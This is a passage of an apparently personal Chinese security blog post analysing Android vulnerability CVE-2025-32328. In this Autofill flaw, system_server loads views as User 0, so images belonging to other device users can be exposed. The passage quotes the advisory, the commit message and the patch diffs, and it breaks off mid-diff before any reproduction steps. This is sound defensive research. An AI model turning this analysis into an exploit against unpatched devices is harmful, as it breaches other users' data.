<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="alternate" href="/rss.xml" title="此时相望不相闻，愿逐月华流照君" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="此时相望不相闻，愿逐月华流照君" type="application/atom+xml"><link rel="alternate" type="application/json" title="此时相望不相闻，愿逐月华流照君" href="https://cyb141520.github.io/feed.json"><link rel="preconnect" href="https://s4.zstatic.net"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&amp;display=swap&amp;subset=latin,latin-ext" media="none" onload="this.media='all'"><link rel="modulepreload" href="/js/siteInit.js"><link rel="modulepreload" href="/js/nyx-player-GAYVXOT2.js"><link rel="modulepreload" href="/js/copy-tex-ZB3YLK4M.js"><link rel="modulepreload" href="/js/post-IGXPDX6N.js"><link rel="modulepreload" href="/js/chunk-2MYORO2B.js"><link rel="modulepreload" href="/js/pagefind-U2ETNMP3.js"><link rel="modulepreload" href="/js/index.esm-LV2XXO35.js"><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"><link rel="modulepreload" href="/js/chunk-QNA7Z54Y.js"><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media='all'"><link rel="preload" href="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/background/111.png" as="image" fetchpriority="high"><meta name="keywords" content="Android,"><link rel="canonical" href="https://cyb141520.github.io/2026/01/14/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/Android%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>Android漏洞复现</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope="" itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope="" itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Android漏洞复现</h1><div class="meta"><span class="item" title="创建时间：2026-01-14 10:14:13"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-01-14T10:14:13+08:00">2026-01-14</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>42k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>38 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">vvwwv</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/background/111.png" loading="eager" decoding="async" fetchpriority="high" alt="此时相望不相闻，愿逐月华流照君"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement="" itemscope="" itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/Android/" itemprop="item" rel="index" title="分类于Android"><span itemprop="name">Android<meta itemprop="position" content="0"></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/Android/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于漏洞复现"><span itemprop="name">漏洞复现<meta itemprop="position" content="1"></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://cyb141520.github.io/2026/01/14/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/Android%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"><meta itemprop="name" content="vvwwv"><meta itemprop="description" content=", "></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="此时相望不相闻，愿逐月华流照君"></span><div class="body md" itemprop="articleBody"><h1 id="一-cve-2025-32328"><a class="anchor" href="#一-cve-2025-32328">#</a> 一、CVE-2025-32328</h1>
<p>在2025-12-01 安全补丁中</p>
<p><img loading="lazy" src="https://cdn.nlark.com/yuque/0/2025/png/35603403/1766460173756-3b0efb5b-3449-48f9-813d-630fe5e40bce.png" alt="img"></p>
<h2 id="一-漏洞原因"><a class="anchor" href="#一-漏洞原因">#</a> (一) 漏洞原因</h2>
<h3 id="1-nvd描述"><a class="anchor" href="#1-nvd描述">#</a> 1. NVD描述</h3>
<p>Session.java 的多个函数中存在一个逻辑错误，可能导致攻击者能够查看设备上其他用户的图像。这可能导致本地权限提升，而无需额外的执行权限。利用此漏洞无需用户交互【  Autofill UI 在 system_server 中，用 User 0 的身份，替当前前台用户“代为访问”了 User 0 的资源。  也就是可以使用户的 App 用system_server 用了 User 0 Context 访问 其他用户 下 App / Media / Provider 的数据】</p>
<h3 id="2-commit信息"><a class="anchor" href="#2-commit信息">#</a> 2. commit信息</h3>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-tex"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Fix Autofill Inflating as User 0</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Autofill will inflate views as the current foreground user instead of</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">the system_server user </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">.</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">//修复自动填充以用户 0 身份加载的问题，自动填充功能将以当前前台用户身份加载视图，而不是系统服务器用户 </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">。</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">实际上：Autofill UI 在 system_server 中使用了 User 0 的 Context 去 inflate RemoteViews，</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">而不是当前前台用户的 Context。</span></span></code></pre>
<ul>
<li><strong>user0</strong>：在Android系统中，user0通常指的是主用户或系统用户。这个用户具有相对较高的权限，能够访问更多的系统资源和执行更广泛的系统级操作。user0下的应用通常可以访问系统文件、服务以及其他关键资源</li>
<li><strong>当前用户身份</strong>：通常指的是在多用户模式下创建的其他用户。它们的权限受到限制，主要是为了保护每个用户的隐私和数据安全。各用户的应用只能访问自己创建的数据和文件，以及通过特定机制共享的数据。</li>
</ul>
<p>注：在Android中，应用的uid是和当前的用户有关的，同一个应用具有相同的appId，其uid的计算方式为： uid = userId * 1000000 + appId，在主用户中，uid = appId</p>
<p>安卓的多用户模式实际上是多个用户空间，各个用户之间数据是不互通的，当前进程启动一个其他进程的activity，那么这个activity的数据和其他地方就不互通，包括调用一个静态数据，虽然可以调用到，但是数据是不互通的</p>
<h3 id="3-diff信息"><a class="anchor" href="#3-diff信息">#</a> 3. diff信息</h3>
<p>改变的五个文件都在autofill下：</p>
<p><img loading="lazy" src="https://cdn.nlark.com/yuque/0/2025/png/35603403/1766997349199-220e6428-6225-4687-97ec-88a0ea874b46.png" alt="img"></p>
<p>关于<a target="_blank" rel="noopener" href="https://henleylee.github.io/posts/2019/1bd5d1e1.html">context解析</a></p>
<p>在<code>/server/autofill/ui/DialogFillUi.java</code>和<code>/server/autofill/ui/FillUi.java</code>里做了同样的修改如下：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">117</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">120</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mUserContext </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Helper</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getUserContext</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mContext</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//修改代码：presentation.applyWithTheme(mContext, ...)为：</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">presentation</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">applyWithTheme</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mUserContext</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#999999;--shiki-dark:#666666"> ...</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">153</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">156</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mUserContext </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Helper</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getUserContext</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mContext</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//修改代码：presentation.applyWithTheme(mContext, ...)为：</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">presentation</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">applyWithTheme</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mUserContext</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#999999;--shiki-dark:#666666"> ...</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span></code></pre>
<p>原本使用</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mContext </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> ContextThemeWrapper</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">context</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> mThemeId</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//context = system_server 的 Context</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//ContextThemeWrapper：A context wrapper that allows you to modify or replace the theme of the wrapped context.</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//用style中的各个属性，去覆盖已有的context中的属性，覆盖之后得到的context就是改变了部分属性后的 context了，然后用这个context去构建View，View中拿到的属性也就是新的值了。</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//它就是一个可以指定Theme的Context包装。用于在View构造时为其提供Theme属性集。</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">/**ContextThemeWrapper 内部包含了与主题相关的接口，有自己的 Theme 和 Resource 成员，并且 Resource 可以传入自己的配置初始化。即 Theme 和 Resource 相关的行为不再是直接调用 mBase 的方法了，也就说，ContextThemeWrapper 和它的 mBase 成员在 Resource 和 Theme 相关的行为上是不同的**/</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">presentation</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">applyWithTheme</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">mContext</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#999999;--shiki-dark:#666666"> ...</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//参数是通过上面的获取的</span></span></code></pre>
<p>在上面说的添加新的代码中：mUserContext = Helper.getUserContext(mContext);，</p>
<p>使用了：/autofill/Helper.java中新增的代码，使得userId=当前前台用户id</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">     *</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Creates the context as the foreground user</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">     *</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//以前台用户身份创建context</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">     *</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Returns the current context as the current foreground user</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">     *</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//返回当前context，即当前前台用户</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">RequiresPermission</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">INTERACT_ACROSS_USERS</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> static</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Context </span><span style="color:#59873A;--shiki-dark:#80A665">getUserContext</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Context context</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">        int</span><span style="color:#B07D48;--shiki-dark:#BD976A"> userId</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> ActivityManager</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getCurrentUser</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//设置userid= 当前前台用户</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        Context</span><span style="color:#B07D48;--shiki-dark:#BD976A"> c</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> context</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">createContextAsUser</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">UserHandle</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">of</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">userId</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> /* flags= */</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">sDebug</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//在开头public static boolean sDebug = true;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">            Slog</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                    TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">                    "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Current User: </span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">                            +</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> userId</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">                            +</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">, context created as: </span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">                            +</span><span style="color:#B07D48;--shiki-dark:#BD976A"> c</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getContentResolver</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getUserId</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">        return</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> c</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">【 </span><span style="color:#B07D48;--shiki-dark:#BD976A">context</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">createContextAsUser函数的返回含义</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">】</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">    /**</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">      * Checks the URI permissions of the remote view,</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">      * to see if the current userId is able to access it.</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">      * 检查远程视图的 URI 权限，查看当前用户 ID 是否能够访问它。</span></span></code></pre>
<p>然后在<code>/autofill/session</code>修改了两部分代码，都是if条件中的内容，进行了进一步的防护：</p>
<p>这是<strong>第二层防护</strong>：</p>
<ul>
<li>防止 AutofillService 的 Binder 调用身份</li>
<li>影响 PackageManager / resource 加载</li>
</ul>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#2F798A;--shiki-dark:#4C9A91">1</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">         int</span><span style="color:#B07D48;--shiki-dark:#BD976A"> iconResourceId</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> response</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getIconResourceId</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">         if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">iconResourceId </span><span style="color:#AB5959;--shiki-dark:#CB7676">!=</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            serviceIcon </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getMaster</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getContext</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getPackageManager</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">getDrawable</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#B07D48;--shiki-dark:#BD976A">                    mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getServicePackageName</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                    iconResourceId</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">                    null</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">            long</span><span style="color:#B07D48;--shiki-dark:#BD976A"> token</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Binder</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">clearCallingIdentity</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//新增</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">            try</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                serviceIcon </span><span style="color:#999999;--shiki-dark:#666666">=</span></span>
